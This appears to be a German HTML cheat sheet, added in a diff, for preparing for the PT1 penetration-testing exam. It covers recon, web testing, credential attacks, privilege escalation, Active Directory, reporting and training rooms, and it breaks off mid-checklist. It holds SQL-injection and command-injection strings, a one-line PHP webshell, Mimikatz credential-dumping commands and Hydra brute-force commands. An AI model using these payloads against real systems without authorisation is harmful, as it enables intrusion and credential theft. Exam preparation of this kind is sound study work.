@@ -1,0 +1,845 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8">
+  <title>PT1 Arsenal – Methoden, Tools, Ressourcen</title>
+  <style>
+    :root {
+      --bg: #020617;
+      --card: #020617;
+      --accent: #38bdf8;
+      --accent-soft: rgba(56, 189, 248, 0.15);
+      --accent-strong: #0ea5e9;
+      --text: #e5e7eb;
+      --muted: #9ca3af;
+      --border: #1f2937;
+      --border2: #1e293b;
+    }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      padding: 24px;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      background: radial-gradient(circle at top, #020617 0, #020617 55%);
+      color: var(--text);
+    }
+    .container {
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+    h1 {
+      font-size: 2.1rem;
+      margin-bottom: 0.1rem;
+    }
+    h1 span { color: var(--accent); }
+    .subtitle {
+      color: var(--muted);
+      margin-bottom: 1.3rem;
+      font-size: 0.92rem;
+    }
+    .pill-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.5rem;
+      margin-bottom: 1.5rem;
+    }
+    .pill {
+      padding: 0.12rem 0.7rem;
+      border-radius: 999px;
+      border: 1px solid rgba(148, 163, 184, 0.4);
+      font-size: 0.78rem;
+      color: var(--muted);
+      background: rgba(15, 23, 42, 0.75);
+    }
+    .grid {
+      display: grid;
+      grid-template-columns: minmax(0, 1.7fr) minmax(0, 1.2fr);
+      gap: 1rem;
+    }
+    @media (max-width: 1000px) {
+      .grid { grid-template-columns: minmax(0, 1fr); }
+    }
+    .card {
+      background: radial-gradient(circle at top left, #020617, #020617);
+      border-radius: 14px;
+      border: 1px solid rgba(31, 41, 55, 0.95);
+      padding: 14px 16px;
+      margin-bottom: 0.9rem;
+      box-shadow:
+        0 20px 32px rgba(15, 23, 42, 0.75),
+        0 0 0 1px rgba(15, 23, 42, 0.9);
+    }
+    .card-accent {
+      border-color: rgba(56, 189, 248, 0.5);
+      box-shadow:
+        0 0 0 1px rgba(56, 189, 248, 0.25),
+        0 24px 60px rgba(8, 47, 73, 0.9);
+    }
+    .card h2 {
+      font-size: 1rem;
+      margin-top: 0;
+      margin-bottom: 0.4rem;
+    }
+    .tagline {
+      color: var(--muted);
+      font-size: 0.8rem;
+      margin-bottom: 0.5rem;
+    }
+    details {
+      margin-top: 0.4rem;
+      margin-bottom: 0.4rem;
+      border-radius: 10px;
+      background: linear-gradient(135deg, #020617, #020617);
+      border: 1px solid var(--border2);
+    }
+    details > summary {
+      cursor: pointer;
+      list-style: none;
+      padding: 6px 10px;
+      display: flex;
+      align-items: center;
+      gap: 0.4rem;
+      font-size: 0.9rem;
+      color: var(--muted);
+    }
+    details[open] > summary {
+      color: var(--accent);
+      border-bottom: 1px solid rgba(15, 23, 42, 0.95);
+      background: radial-gradient(circle at top left, rgba(15,23,42,0.9), rgba(15,23,42,0.95));
+    }
+    details > summary::-webkit-details-marker { display: none; }
+    .bullet {
+      width: 6px;
+      height: 6px;
+      border-radius: 999px;
+      background: var(--accent);
+      box-shadow: 0 0 0 4px rgba(56, 189, 248, 0.18);
+    }
+    .details-body {
+      padding: 8px 10px 10px 10px;
+      font-size: 0.9rem;
+    }
+    pre {
+      background: radial-gradient(circle at top left, #020617, #020617);
+      border-radius: 8px;
+      border: 1px solid rgba(37, 99, 235, 0.7);
+      padding: 9px 10px;
+      overflow-x: auto;
+      font-size: 0.8rem;
+      margin-bottom: 0.4rem;
+    }
+    code {
+      font-family: "JetBrains Mono", SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace;
+      color: #e5e7eb;
+    }
+    ul, ol {
+      margin: 0.3rem 0 0.5rem 1.1rem;
+      padding: 0;
+      font-size: 0.88rem;
+    }
+    li { margin-bottom: 0.18rem; }
+    .mini-label {
+      font-size: 0.72rem;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      color: var(--muted);
+      margin: 0.1rem 0 0.2rem;
+    }
+    .if-then {
+      font-size: 0.8rem;
+      border-left: 2px solid rgba(56, 189, 248, 0.6);
+      padding-left: 7px;
+      margin: 0.25rem 0;
+      color: var(--muted);
+    }
+    a {
+      color: var(--accent-strong);
+      text-decoration: none;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+    .pill-small {
+      display: inline-block;
+      border-radius: 999px;
+      border: 1px solid rgba(148, 163, 184, 0.6);
+      padding: 1px 7px;
+      font-size: 0.72rem;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      color: var(--muted);
+      margin-right: 0.35rem;
+    }
+    .highlight {
+      color: var(--accent-strong);
+    }
+  </style>
+</head>
+<body>
+<div class="container">
+  <h1>PT1 Arsenal <span>– Methoden, Tools, Ressourcen</span></h1>
+  <p class="subtitle">
+    Zweck dieses Dokuments ist es, Vorgehen, Befehle und Ressourcen so zu bündeln, dass sie in Stresssituationen nachvollziehbar bleiben.
+  </p>
+  <div class="pill-row">
+    <span class="pill">Phasen: Recon → Enumeration → Access → Privesc → Lateral/Domain → Reporting</span>
+    <span class="pill">Regel: Wenn kein Fortschritt erkennbar ist, wird zur vorherigen Phase zurückgekehrt.</span>
+    <span class="pill">Vorbereitung: Inhalte vor dem Examen verinnerlichen, nicht währenddessen nachschlagen.</span>
+  </div>
+
+  <div class="grid">
+    <!-- Linke Spalte -->
+    <div>
+      <!-- METHODIK -->
+      <div class="card card-accent">
+        <h2>0. Grundmethodik</h2>
+        <p class="tagline">
+          Ziel: Eine feste Struktur, die auch ohne spontane Ideen einen nächsten Schritt erlaubt.
+        </p>
+
+        <details open>
+          <summary><span class="bullet"></span> Die 6 Phasen im Überblick</summary>
+          <div class="details-body">
+            <ol>
+              <li><strong>Recon:</strong> Identifikation der erreichbaren Hosts und Dienste.</li>
+              <li><strong>Enumeration:</strong> Vertiefte Informationssammlung zu einzelnen Diensten.</li>
+              <li><strong>Initial Access:</strong> Erster Zugriff (z. B. über Web, schwache Passwörter, Exploit).</li>
+              <li><strong>Privilege Escalation:</strong> Erhöhung der Berechtigungen auf dem System.</li>
+              <li><strong>Lateral/Domain:</strong> Bewegung innerhalb eines Netzes oder einer Domäne (falls vorhanden).</li>
+              <li><strong>Reporting:</strong> Saubere Dokumentation von Schwachstellen, Ausnutzung und Auswirkungen.</li>
+            </ol>
+            <p class="if-then">
+              Diese Reihenfolge stellt sicher, dass Ausnutzung nicht vor der Informationslage erfolgt. Wenn in einer Phase kein Fortschritt erzielt wird, ist es sinnvoll, zur vorherigen Phase zurückzugehen und weitere Informationen zu sammeln.
+            </p>
+          </div>
+        </details>
+      </div>
+
+      <!-- RECON & ENUM -->
+      <div class="card">
+        <h2>1. Recon &amp; Netzwerk-Enumeration</h2>
+        <p class="tagline">
+          Ziel: Vollständiger Überblick über erreichbare Dienste. Ohne diese Grundlage sind spätere Schritte zufällig.
+        </p>
+
+        <details open>
+          <summary><span class="bullet"></span> Nmap – Standard und aggressiv</summary>
+          <div class="details-body">
+            <div class="mini-label">Standard-Recon</div>
+            <pre><code>nmap -sV -sC -Pn &lt;IP&gt;</code></pre>
+            <ul>
+              <li><code>-sV</code>: Identifiziert den Dienst und dessen Version.</li>
+              <li><code>-sC</code>: Führt Standard-Skripte aus, um typische Informationen zu sammeln.</li>
+              <li><code>-Pn</code>: Deaktiviert Host-Discovery; sinnvoll, wenn ICMP geblockt ist.</li>
+            </ul>
+            <p class="if-then">
+              Dieser Scan eignet sich am Anfang, um zügig eine brauchbare Übersicht zu erhalten.
+            </p>
+            <div class="mini-label">Aggressiver Scan</div>
+            <pre><code>nmap -sV -sC -A -Pn &lt;IP&gt;</code></pre>
+            <ul>
+              <li><code>-A</code>: Ergänzt OS-Erkennung, Traceroute und weitere Skripte.</li>
+            </ul>
+            <div class="mini-label">Alle Ports</div>
+            <pre><code>nmap -p- --min-rate 2000 -Pn &lt;IP&gt;</code></pre>
+            <p class="if-then">
+              Wenn der erste Scan nur wenige Dienste zeigt und keine Ansatzpunkte liefert, kann ein Scan aller Ports sinnvoll sein, um „ungewöhnliche“ Ports zu entdecken.
+            </p>
+          </div>
+        </details>
+
+        <details>
+          <summary><span class="bullet"></span> Dienste interpretieren</summary>
+          <div class="details-body">
+            <p>Ziel: Dienste nicht nur als Portliste, sondern als Angriffsoberfläche zu verstehen.</p>
+            <ul>
+              <li><strong>80/443:</strong> Webserver → mögliche Logins, Uploads, APIs, Admin-Panels.</li>
+              <li><strong>21:</strong> FTP → anonymer Login, Datei-Upload.</li>
+              <li><strong>22:</strong> SSH → direkte Shell bei gültigen Zugangsdaten.</li>
+              <li><strong>139/445:</strong> SMB → Freigaben, Anonymer Zugriff, Benutzer-Enum.</li>
+              <li><strong>3389:</strong> RDP → grafischer Zugriff, wenn Zugangsdaten vorhanden sind.</li>
+              <li><strong>389/636:</strong> LDAP → AD-Informationen, falls anonym oder mit schwachen Creds zugänglich.</li>
+              <li><strong>1433/3306/5432:</strong> Datenbanken → mögliche SQL-Logins oder RCE via Funktionen.</li>
+            </ul>
+            <p class="if-then">
+              Werden AD-typische Dienste (z. B. Domain Controller, LDAP, Kerberos) erkannt, sollte Active Directory im weiteren Vorgehen berücksichtigt werden.
+            </p>
+          </div>
+        </details>
+
+        <details>
+          <summary><span class="bullet"></span> SMB, RPC, LDAP</summary>
+          <div class="details-body">
+            <p>Ziel: Auf Windows-/AD-Strukturen zugreifen und Informationen zu Benutzern und Freigaben gewinnen.</p>
+            <div class="mini-label">SMB</div>
+            <pre><code>smbclient -L //&lt;IP&gt; -N
+smbclient //&lt;IP&gt;/&lt;share&gt; -N</code></pre>
+            <div class="mini-label">RPC</div>
+            <pre><code>rpcclient -U "" -N &lt;IP&gt;
+rpcclient $&gt; enumdomusers
+rpcclient $&gt; enumdomgroups</code></pre>
+            <div class="mini-label">LDAP</div>
+            <pre><code>ldapsearch -x -H ldap://&lt;IP&gt; -b "dc=example,dc=local"</code></pre>
+            <p class="if-then">
+              Wenn diese Zugriffe fehlschlagen, ist der Dienst entweder restriktiv konfiguriert oder es sind andere Wege (z. B. Web) zunächst erfolgversprechender.
+            </p>
+          </div>
+        </details>
+
+        <details>
+          <summary><span class="bullet"></span> Online-Ressourcen für Recon</summary>
+          <div class="details-body">
+            <ul>
+              <li>Nmap Doku: <a href="https://nmap.org/book/man.html" target="_blank">https://nmap.org/book/man.html</a></li>
+              <li>Vulners: <a href="https://vulners.com/" target="_blank">https://vulners.com/</a></li>
+              <li>CVEs: <a href="https://cve.mitre.org/" target="_blank">https://cve.mitre.org/</a></li>
+              <li>NVD: <a href="https://nvd.nist.gov/" target="_blank">https://nvd.nist.gov/</a></li>
+            </ul>
+          </div>
+        </details>
+      </div>
+
+      <!-- WEB -->
+      <div class="card">
+        <h2>2. Web-Arsenal</h2>
+        <p class="tagline">
+          Ziel: Webanwendungen strukturiert untersuchen, anstatt wahllos Eingaben zu probieren.
+        </p>
+
+        <details open>
+          <summary><span class="bullet"></span> Fingerprinting &amp; Basiszugriff</summary>
+          <div class="details-body">
+            <p>Zunächst soll der eingesetzte Technologie-Stack festgestellt werden.</p>
+            <div class="mini-label">WhatWeb / Wappalyzer</div>
+            <pre><code>whatweb http://&lt;IP&gt;
+whatweb https://&lt;IP&gt;</code></pre>
+            <p>Im Browser: Wappalyzer-Plugin kann Frameworks, Servertypen und Versionen anzeigen.</p>
+            <div class="mini-label">HTTP vs. HTTPS</div>
+            <pre><code>curl -I http://&lt;IP&gt;
+curl -k -I https://&lt;IP&gt;</code></pre>
+            <p class="if-then">
+              Wenn Port 443 offen ist, sollte immer geprüft werden, ob die Anwendung ausschließlich über HTTPS erreichbar ist.
+            </p>
+          </div>
+        </details>
+
+        <details>
+          <summary><span class="bullet"></span> Verzeichnisse &amp; Dateien</summary>
+          <div class="details-body">
+            <p>Ziel: Versteckte Bereiche der Anwendung (z. B. /admin, /test, /backup) auffinden.</p>
+            <div class="mini-label">Gobuster</div>
+            <pre><code>gobuster dir -u http://&lt;IP&gt;/ \
+  -w /usr/share/wordlists/dirb/common.txt
+
+gobuster dir -k -u https://&lt;IP&gt;/ \
+  -w /usr/share/wordlists/dirb/big.txt</code></pre>
+            <p class="if-then">
+              Wenn viele Antworten 403 oder 401 liefern, existiert der Pfad dennoch. In diesem Fall kann Authentifizierung oder ein anderer Zugriffsweg relevant sein.
+            </p>
+          </div>
+        </details>
+
+        <details>
+          <summary><span class="bullet"></span> Nikto &amp; einfache Schwachstellen</summary>
+          <div class="details-body">
+            <p>Nikto untersucht typische Fehlkonfigurationen und Standarddateien.</p>
+            <pre><code>nikto -h http://&lt;IP&gt;
+nikto -h https://&lt;IP&gt; -ssl</code></pre>
+            <p>Ausgaben sollten kritisch betrachtet und mit weiteren Tests kombiniert werden.</p>
+          </div>
+        </details>
+
+        <details>
+          <summary><span class="bullet"></span> Eingaben, Injection und Traversal</summary>
+          <div class="details-body">
+            <p>Ziel: Prüfen, ob Eingaben ungefiltert in Befehle oder SQL-Statements einfließen.</p>
+            <div class="mini-label">SQLi-Varianten</div>
+            <pre><code>' OR '1'='1
+' OR '1'='1' --
+" OR "1"="1" --
+admin'--</code></pre>
+            <div class="mini-label">Traversal / LFI</div>
+            <pre><code>../../../../etc/passwd
+../../../../Windows/win.ini</code></pre>
+            <div class="mini-label">Beispiel für PowerShell-/Code-Injection</div>
+            <pre><code>'); whoami #
+'); dir #
+'); dir C:\Users #
+'); type C:\Users\dev\Desktop\user.txt #</code></pre>
+            <p class="if-then">
+              Wenn statt der erwarteten Ausgabe (z. B. Logs) plötzlich Verzeichnislisten oder Systembefehle erscheinen, liegt eine Codeausführung vor.
+            </p>
+          </div>
+        </details>
+
+        <details>
+          <summary><span class="bullet"></span> Reverse Shells &amp; Webshells</summary>
+          <div class="details-body">
+            <p>Bei Remote Code Execution kann eine interaktive Shell eingerichtet werden.</p>
+            <div class="mini-label">Reverse Shell Generatoren</div>
+            <ul>
+              <li><a href="https://revshells.com/" target="_blank">https://revshells.com/</a></li>
+              <li><a href="https://www.revshellgen.com/" target="_blank">https://www.revshellgen.com/</a></li>
+              <li><a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank">Pentestmonkey Reverse Shell Cheatsheet</a></li>
+            </ul>
+            <div class="mini-label">Netcat Listener</div>
+            <pre><code>nc -lvnp 4444</code></pre>
+            <div class="mini-label">Einfache PHP-Webshell</div>
+            <pre><code>&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
+          </div>
+        </details>
+
+        <details>
+          <summary><span class="bullet"></span> Wichtige Web-Ressourcen</summary>
+          <div class="details-body">
+            <ul>
+              <li>OWASP Top 10: <a href="https://owasp.org/www-project-top-ten/" target="_blank">https://owasp.org/www-project-top-ten/</a></li>
+              <li>PortSwigger Academy: <a href="https://portswigger.net/web-security" target="_blank">https://portswigger.net/web-security</a></li>
+              <li>HackTricks Web: <a href="https://hacktricks.xyz/web" target="_blank">https://hacktricks.xyz/web</a></li>
+              <li>PayloadsAllTheThings: <a href="https://payloadsallthethings.github.io/" target="_blank">https://payloadsallthethings.github.io/</a></li>
+            </ul>
+          </div>
+        </details>
+      </div>
+
+      <!-- CREDS / CRACKING -->
+      <div class="card">
+        <h2>3. Credentials, Brute-Force, Hashes</h2>
+        <p class="tagline">
+          Ziel: Vorhandene Benutzernamen und Hashes effektiv zu nutzen, anstatt auf Zufall zu setzen.
+        </p>
+
+        <details open>
+          <summary><span class="bullet"></span> Hydra – Brute-Force-Beispiele</summary>
+          <div class="details-body">
+            <div class="mini-label">HTTP Login</div>
+            <pre><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+  &lt;IP&gt; http-post-form "/login.php:user=^USER^&amp;pass=^PASS^:F=Login failed"</code></pre>
+            <div class="mini-label">SSH</div>
+            <pre><code>hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://&lt;IP&gt;</code></pre>
+            <p class="if-then">
+              Brute-Force sollte sparsam und zielgerichtet eingesetzt werden, insbesondere bei begrenzter Zeit.
+            </p>
+          </div>
+        </details>
+
+        <details>
+          <summary><span class="bullet"></span> Hashes &amp; Hashcat</summary>
+          <div class="details-body">
+            <div class="mini-label">Hash identifizieren</div>
+            <pre><code>hashid &lt;hash&gt;</code></pre>
+            <p>Online: <a href="https://hashes.com/en/tools/hash_identifier" target="_blank">https://hashes.com/en/tools/hash_identifier</a></p>
+            <div class="mini-label">Beispiel für Hashcat</div>
+            <pre><code>hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
+          </div>
+        </details>
+
+        <details>
+          <summary><span class="bullet"></span> Default-Credentials</summary>
+          <div class="details-body">
+            <p>Standardzugänge sollten bei neu eingerichteten Systemen immer geprüft werden.</p>
+            <pre><code>admin:admin
+admin:password
+test:test
+guest:guest
+user:user</code></pre>
+            <ul>
+              <li><a href="https://default-password.info/" target="_blank">https://default-password.info/</a></li>
+              <li><a href="https://cirt.net/passwords" target="_blank">https://cirt.net/passwords</a></li>
+            </ul>
+          </div>
+        </details>
+      </div>
+
+      <!-- PRIVESC -->
+      <div class="card">
+        <h2>4. Privilege Escalation</h2>
+        <p class="tagline">
+          Ziel: Vom normalen Benutzer zu Administrator/Root/SYSTEM gelangen, um vollen Zugriff zu erhalten.
+        </p>
+
+        <details open>
+          <summary><span class="bullet"></span> Windows – Grundlegende Abfragen</summary>
+          <div class="details-body">
+            <pre><code>whoami
+whoami /groups
+whoami /priv
+hostname
+systeminfo</code></pre>
+            <p class="if-then">
+              Diese Befehle liefern eine erste Einschätzung, ob bereits erhöhte Rechte vorhanden sind oder Privilegien auf bekannte Angriffswege hinweisen.
+            </p>
+          </div>
+        </details>
+
+        <details>
+          <summary><span class="bullet"></span> Windows – Tools</summary>
+          <div class="details-body">
+            <div class="mini-label">WinPEAS</div>
+            <pre><code>winpeas.exe</code></pre>
+            <div class="mini-label">PowerUp</div>
+            <pre><code>Import-Module .\PowerUp.ps1
+Invoke-AllChecks</code></pre>
+            <p>
+              Diese Werkzeuge durchsuchen das System nach typischen Fehlkonfigurationen, z. B. unzureichend geschützten Diensten oder unquoted service paths.
+            </p>
+            <p>Ressourcen:</p>
+            <ul>
+              <li>HackTricks Windows LPE: <a href="https://hacktricks.xyz/windows-hardening/windows-local-privilege-escalation" target="_blank">https://hacktricks.xyz/windows-hardening/windows-local-privilege-escalation</a></li>
+              <li>LOLBAS: <a href="https://lolbas-project.github.io/" target="_blank">https://lolbas-project.github.io/</a></li>
+            </ul>
+          </div>
+        </details>
+
+        <details>
+          <summary><span class="bullet"></span> Linux – Grundlegende Abfragen</summary>
+          <div class="details-body">
+            <pre><code>whoami
+id
+uname -a
+sudo -l
+find / -perm -u=s -type f 2&gt;/dev/null</code></pre>
+            <p>
+              Ziel ist es, SUID-Binaries, sudo-Rechte und Systemkonfigurationen zu identifizieren, die eine Rechteerhöhung ermöglichen.
+            </p>
+            <div class="mini-label">LinPEAS</div>
+            <pre><code>./linpeas.sh</code></pre>
+            <p>Ressourcen:</p>
+            <ul>
+              <li>GTFOBins: <a href="https://gtfobins.github.io/" target="_blank">https://gtfobins.github.io/</a></li>
+              <li>HackTricks Linux LPE: <a href="https://hacktricks.xyz/linux-hardening/privilege-escalation" target="_blank">https://hacktricks.xyz/linux-hardening/privilege-escalation</a></li>
+            </ul>
+          </div>
+        </details>
+      </div>
+    </div>
+
+    <!-- Rechte Spalte -->
+    <div>
+      <!-- AD -->
+      <div class="card">
+        <h2>5. Active Directory – Überblick</h2>
+        <p class="tagline">
+          Ziel: Erkennen, ob AD beteiligt ist, und grundlegende Schritte durchführen.
+        </p>
+
+        <details open>
+          <summary><span class="bullet"></span> AD erkennen</summary>
+          <div class="details-body">
+            <pre><code>whoami
+systeminfo | findstr /B /C:"Domain"</code></pre>
+            <p class="if-then">
+              Wenn die Ausgabe einen Domänennamen und ein Muster wie <code>DOMAIN\user</code> zeigt, befindet sich das System in einer Active-Directory-Umgebung.
+            </p>
+          </div>
+        </details>
+
+        <details>
+          <summary><span class="bullet"></span> SharpHound / BloodHound</summary>
+          <div class="details-body">
+            <div class="mini-label">Daten sammeln</div>
+            <pre><code>Import-Module .\SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All -Domain &lt;domain&gt; -ZipFileName data.zip</code></pre>
+            <p>
+              Anschließend kann das ZIP in BloodHound geladen werden, um Beziehungen und mögliche Wege zu erhöhten Rechten zu erkennen.
+            </p>
+            <p>Dokumentation: <a href="https://bloodhound.readthedocs.io/" target="_blank">BloodHound Doku</a></p>
+          </div>
+        </details>
+
+        <details>
+          <summary><span class="bullet"></span> Mimikatz – Basis</summary>
+          <div class="details-body">
+            <pre><code>privilege::debug
+sekurlsa::logonpasswords</code></pre>
+            <p class="if-then">
+              Erfolgreiche Ausführung kann Klartext-Anmeldedaten und Hashes liefern, die für weitere Logins und Angriffe genutzt werden können.
+            </p>
+          </div>
+        </details>
+
+        <details>
+          <summary><span class="bullet"></span> AD-Ressourcen</summary>
+          <div class="details-body">
+            <ul>
+              <li>HackTricks AD: <a href="https://hacktricks.xyz/windows-hardening/active-directory-methodology" target="_blank">https://hacktricks.xyz/windows-hardening/active-directory-methodology</a></li>
+              <li>zer1t0 AD-Blog: <a href="https://zer1t0.gitlab.io/posts/attacking_ad/" target="_blank">https://zer1t0.gitlab.io/posts/attacking_ad/</a></li>
+            </ul>
+          </div>
+        </details>
+      </div>
+
+      <!-- PIVOTING -->
+      <div class="card">
+        <h2>6. Pivoting &amp; Tunneling</h2>
+        <p class="tagline">
+          Ziel: Systeme erreichen, die nur aus internen Netzen erreichbar sind.
+        </p>
+
+        <details open>
+          <summary><span class="bullet"></span> SSH-Tunnels</summary>
+          <div class="details-body">
+            <div class="mini-label">Local Port Forward</div>
+            <pre><code>ssh -L 8080:internal-ip:80 user@jump-host</code></pre>
+            <div class="mini-label">Dynamic SOCKS Proxy</div>
+            <pre><code>ssh -D 9050 user@jump-host</code></pre>
+            <p>In Verbindung mit ProxyChains können interne Dienste durch den Tunnel angesprochen werden.</p>
+          </div>
+        </details>
+
+        <details>
+          <summary><span class="bullet"></span> Chisel &amp; Ligolo-ng</summary>
+          <div class="details-body">
+            <p>
+              Werkzeuge wie Chisel oder Ligolo-ng unterstützen komplexere Pivot-Szenarien. Für PT1 werden sie insbesondere im AD-Teil erwähnt.
+            </p>
+          </div>
+        </details>
+      </div>
+
+      <!-- EXPLOIT RESEARCH -->
+      <div class="card">
+        <h2>7. Exploit-Recherche</h2>
+        <p class="tagline">
+          Ziel: Zu bekannten Versionen passende Schwachstellen finden, ohne unstrukturiert zu suchen.
+        </p>
+
+        <details open>
+          <summary><span class="bullet"></span> Exploit-Datenbanken</summary>
+          <div class="details-body">
+            <ul>
+              <li>Exploit-DB: <a href="https://www.exploit-db.com/" target="_blank">https://www.exploit-db.com/</a></li>
+              <li>Sploitus: <a href="https://sploitus.com/" target="_blank">https://sploitus.com/</a></li>
+              <li>Packet Storm: <a href="https://packetstormsecurity.com/" target="_blank">https://packetstormsecurity.com/</a></li>
+              <li>Metasploit Framework: <a href="https://github.com/rapid7/metasploit-framework" target="_blank">Metasploit GitHub</a></li>
+            </ul>
+            <div class="mini-label">Lokale Suche mit searchsploit</div>
+            <pre><code>searchsploit &lt;produkt&gt; &lt;version&gt;</code></pre>
+            <p class="if-then">
+              Sobald eine konkrete Versionsnummer bekannt ist, sollte gezielt nach passenden CVEs und Exploits gesucht werden, statt allgemein zu raten.
+            </p>
+          </div>
+        </details>
+      </div>
+
+      <!-- REPORTING -->
+      <div class="card">
+        <h2>8. Reporting</h2>
+        <p class="tagline">
+          Ziel: Schwachstellen so dokumentieren, dass sie für Dritte nachvollziehbar und verwertbar sind.
+        </p>
+
+        <details open>
+          <summary><span class="bullet"></span> Aufbau eines Findings</summary>
+          <div class="details-body">
+            <ul>
+              <li>Titel der Schwachstelle</li>
+              <li>Beschreibung der Ursache (Root Cause)</li>
+              <li>Reproduktionsschritte (möglichst präzise)</li>
+              <li>Nachweis (z. B. Flag, Ausgabe, Screenshot)</li>
+              <li>Auswirkung (technisch und fachlich)</li>
+              <li>Schweregrad (z. B. CVSS mit Begründung)</li>
+              <li>Empfehlung (konkrete Maßnahme, keine rein allgemeine Formulierung)</li>
+            </ul>
+            <p class="if-then">
+              Bei PT1 sollte darauf geachtet werden, die vorgegebenen Kategorien der Plattform zu verwenden, da selbst benannte Kategorien unter Umständen nicht korrekt bewertet werden.
+            </p>
+          </div>
+        </details>
+
+        <details>
+          <summary><span class="bullet"></span> Vorlagen &amp; Hilfsmittel</summary>
+          <div class="details-body">
+            <ul>
+              <li>Pentest-Reportsammlung: <a href="https://github.com/juliocesarfort/public-pentesting-report" target="_blank">public-pentesting-report</a></li>
+              <li>CVSS-Rechner: <a href="https://www.first.org/cvss/calculator/3.1" target="_blank">https://www.first.org/cvss/calculator/3.1</a></li>
+              <li>TryHackMe-Raum „Writing Pentest Reports“ (empfohlen für PT1).</li>
+            </ul>
+          </div>
+        </details>
+      </div>
+
+      <!-- STUCK PLAYBOOK -->
+      <div class="card card-accent">
+        <h2>9. Stuck Playbook</h2>
+        <p class="tagline">
+          Ziel: Vorgehen, wenn kein nächster Schritt offensichtlich ist.
+        </p>
+
+        <details open>
+          <summary><span class="bullet"></span> 5-Fragen-Reset</summary>
+          <div class="details-body">
+            <ol>
+              <li>Welche Dienste laufen sicher? (<code>nmap</code> und Interpretation)</li>
+              <li>Habe ich jeden relevanten Port praktisch getestet (Web geöffnet, SMB, SSH, RDP etc.)?</li>
+              <li>Habe ich alle Eingabefelder und Parameter auf einfache Injections geprüft?</li>
+              <li>Habe ich nach offensichtlichen Dateien wie <code>TODO.txt</code>, <code>config.*</code>, <code>.env</code> gesucht?</li>
+              <li>Suche ich aktuell nach Exploits, ohne ausreichend Informationen über das System zu besitzen?</li>
+            </ol>
+            <p class="if-then">
+              Wenn mehrere dieser Fragen nicht klar beantwortet werden können, ist zusätzliche Enumeration sinnvoller als die Suche nach weiteren Exploits.
+            </p>
+          </div>
+        </details>
+
+        <details>
+          <summary><span class="bullet"></span> Drei-Minuten-Regel</summary>
+          <div class="details-body">
+            <p>
+              Wenn sich innerhalb von drei Minuten kein neuer Informationsgewinn ergibt, sollte bewusst die Phase oder der Angriffspfad gewechselt werden.
+            </p>
+            <ul>
+              <li>Von Exploit-Suche zurück zu Recon oder Enumeration.</li>
+              <li>Von Web-Fokus hin zu Credentials oder Misconfigurations.</li>
+            </ul>
+          </div>
+        </details>
+
+        <details>
+          <summary><span class="bullet"></span> Vier Angriffsachsen</summary>
+          <div class="details-body">
+            <ul>
+              <li><span class="pill-small">Web</span> Analyse von HTTP/HTTPS, Logins, Uploads, API.</li>
+              <li><span class="pill-small">Credentials</span> Suche nach gespeicherten Zugangsdaten, Hashes, Default-Passwörtern.</li>
+              <li><span class="pill-small">Vulnerable Service</span> Bekannte Schwachstellen in identifizierten Versionen.</li>
+              <li><span class="pill-small">Misconfiguration</span> Fehlkonfigurationen wie zu breite Rechte, offene Freigaben, unsichere Dienste.</li>
+            </ul>
+          </div>
+        </details>
+
+        <details>
+          <summary><span class="bullet"></span> Abschluss-Routine</summary>
+          <div class="details-body">
+            <p>Ziel: Nach Erlangen höchster Rechte die relevanten Nachweise (z. B. Flags) strukturiert finden.</p>
+            <div class="mini-label">Windows</div>
+            <pre><code>cd C:\Users\Administrator\Desktop
+dir
+type flag.txt
+
+cd C:\Users\Administrator\Documents
+dir
+type flag.txt</code></pre>
+            <div class="mini-label">Linux</div>
+            <pre><code>cd /root
+ls
+cat flag.txt</code></pre>
+          </div>
+        </details>
+      </div>
+    </div>
+  </div>
+
+  <!-- Trainings-Checkliste -->
+  <div class="card card-accent">
+    <h2>10. Trainings-Checkliste für PT1</h2>
+    <p class="tagline">
+      Ziel: Geordnete Vorbereitung auf PT1 anhand konkreter TryHackMe-Räume. Reihenfolge und Inhalte sind ein Vorschlag, der angepasst werden kann.
+    </p>
+
+    <details open>
+      <summary><span class="bullet"></span> Phase 1 – Fundament (Recon, Enum, einfache Exploits)</summary>
+      <div class="details-body">
+        <p>Ziel: Grundlegendes Verständnis von Recon, Service-Erkennung und einfachen Web-/Host-Angriffen.</p>
+        <ul>
+          <li>Räume (Beispiele): Blue, Pickle Rick, Billing, Rabbit Store</li>
+          <li>Schwerpunkte:
+            <ul>
+              <li>Ergebnisinterpretation von <code>nmap</code>.</li>
+              <li>Einfache Web-Enumeration (Gobuster, Nikto).</li>
+              <li>Umgang mit Standard-Credentials.</li>
+              <li>Basisumgang mit Metasploit, wenn sinnvoll.</li>
+            </ul>
+          </li>
+        </ul>
+      </div>
+    </details>
+
+    <details>
+      <summary><span class="bullet"></span> Phase 2 – Web-Anwendungen</summary>
+      <div class="details-body">
+        <p>Ziel: Typische Web-Schwachstellen erkennen und systematisch ausnutzen.</p>
+        <ul>
+          <li>Räume (empfohlen in Reviews): Pickle Rick, Billing, Rabbit Store, Silver Platter, AVenger, TryHackMe-Web-Fundamentals.</li>
+          <li>Schwerpunkte:
+            <ul>
+              <li>SQL-Injection (insbesondere Login-Bypass).</li>
+              <li>File-Upload und einfache Webshells.</li>
+              <li>Parameter- und Input-Analyse mit Burp Suite.</li>
+              <li>Identifikation von Root Cause, nicht nur „Flag gefunden“.</li>
+            </ul>
+          </li>
+        </ul>
+      </div>
+    </details>
+
+    <details>
+      <summary><span class="bullet"></span> Phase 3 – Privilege Escalation</summary>
+      <div class="details-body">
+        <p>Ziel: Mehrere typische Wege zur Rechteerhöhung auf Windows- und Linux-Systemen kennen und anwenden.</p>
+        <ul>
+          <li>Räume: Linux LPE, Windows LPE, Stealth.</li>
+          <li>Schwerpunkte:
+            <ul>
